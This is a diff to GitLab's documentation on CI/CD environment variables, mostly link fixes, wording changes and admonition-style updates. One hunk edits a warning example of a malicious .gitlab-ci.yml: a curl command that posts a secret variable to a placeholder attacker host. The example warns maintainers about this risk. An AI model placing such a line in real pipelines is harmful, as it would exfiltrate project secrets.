@@ -1,7 +1,7 @@
 ---
 stage: Verify
 group: Continuous Integration
-info: To determine the technical writer assigned to the Stage/Group associated with this page, see https://about.gitlab.com/handbook/engineering/ux/technical-writing/#designated-technical-writers
+info: To determine the technical writer assigned to the Stage/Group associated with this page, see https://about.gitlab.com/handbook/engineering/ux/technical-writing/#assignments
 type: reference
 ---
 
@@ -70,7 +70,7 @@ When you need a specific custom environment variable, you can
 or directly [in the `.gitlab-ci.yml` file](#create-a-custom-variable-in-gitlab-ciyml).
 
 The variables are used by the runner any time the pipeline runs.
-You can also [override variable values manually for a specific pipeline](../pipelines/index.md#specifying-variables-when-running-manual-jobs).
+You can also [override variable values manually for a specific pipeline](../jobs/index.md#specifying-variables-when-running-manual-jobs).
 
 There are two types of variables: **Variable** and **File**. You cannot set types in
 the `.gitlab-ci.yml` file, but you can set them in the UI and API.
@@ -142,7 +142,7 @@ Here is a simplified example of a malicious `.gitlab-ci.yml`:
 ```yaml
 build:
   script:
-    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" https://maliciouswebsite.abcd/
+    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" "https://maliciouswebsite.abcd/"
 ```
 
 ### Custom environment variables of type Variable
@@ -243,7 +243,7 @@ Some variables are listed in the UI so you can choose them more quickly.
 | `AWS_DEFAULT_REGION`    | Any                                                | 12.10         |
 | `AWS_SECRET_ACCESS_KEY` | Any                                                | 12.10         |
 
-CAUTION: **Caution:**
+WARNING:
 When you store credentials, there are security implications. If you are using AWS keys,
 for example, follow their [best practices](https://docs.aws.amazon.com/general/latest/gr/aws-access-keys-best-practices.html).
 
@@ -259,7 +259,7 @@ To access environment variables, use the syntax for your runner's [shell](https:
 |----------------------|------------------------------------------|
 | bash/sh              | `$variable`                              |
 | PowerShell           | `$env:variable` (primary) or `$variable` |
-| Windows Batch        | `%variable%`                             |
+| Windows Batch        | `%variable%`, or `!variable!` for [delayed expansion](https://ss64.com/nt/delayedexpansion.html), which can be used for variables that contain white spaces or newlines. |
 
 ### Bash
 
@@ -423,7 +423,7 @@ Group-level variables can be added by:
 1. Inputting variable types, keys, and values in the **Variables** section.
    Any variables of [subgroups](../../user/group/subgroups/index.md) are inherited recursively.
 
-Once you set them, they are available for all subsequent pipelines. Any group-level user defined variables can be viewed in projects by:
+After you set them, they are available for all subsequent pipelines. Any group-level user defined variables can be viewed in projects by:
 
 1. Navigating to the project's **Settings > CI/CD** page.
 1. Expanding the **Variables** section.
@@ -442,7 +442,7 @@ You can define instance-level variables via the UI or [API](../../api/instance_l
 
 To add an instance-level variable:
 
-1. Navigate to your admin area's **Settings > CI/CD** and expand the **Variables** section.
+1. Navigate to your Admin Area's **Settings > CI/CD** and expand the **Variables** section.
 1. Click the **Add variable** button, and fill in the details:
 
    - **Key**: Must be one line, using only letters, numbers, or `_` (underscore), with no spaces.
@@ -590,7 +590,7 @@ variables](../../topics/autodevops/customize.md#application-secret-variables) ar
 then available as environment variables on the running application
 container.
 
-CAUTION: **Caution:**
+WARNING:
 Variables with multi-line values are not supported due to
 limitations with the Auto DevOps scripting environment.
 
@@ -798,7 +798,7 @@ deploy_staging:
     - if: '$RELEASE =~ $STAGINGRELS'
 ```
 
-NOTE: **Note:**
+NOTE:
 The available regular expression syntax is limited. See [related issue](https://gitlab.com/gitlab-org/gitlab/-/issues/35438)
 for more details.
 
@@ -825,7 +825,7 @@ testvariable:
 
 > Introduced in GitLab Runner 1.7.
 
-CAUTION: **Warning:**
+WARNING:
 Enabling debug tracing can have severe security implications. The
 output **will** contain the content of all your variables and any other
 secrets! The output **will** be uploaded to the GitLab server and made visible
@@ -841,7 +841,7 @@ Available on GitLab Runner v1.7+, this feature enables the shell's execution log
 
 Before enabling this, you should ensure jobs are visible to
 [team members only](../../user/permissions.md#project-features). You should
-also [erase](../pipelines/index.md#view-jobs-in-a-pipeline) all generated job logs
+also [erase](../jobs/index.md#view-jobs-in-a-pipeline) all generated job logs
 before making them visible again.
 
 To enable debug logs (traces), set the `CI_DEBUG_TRACE` variable to `true`:
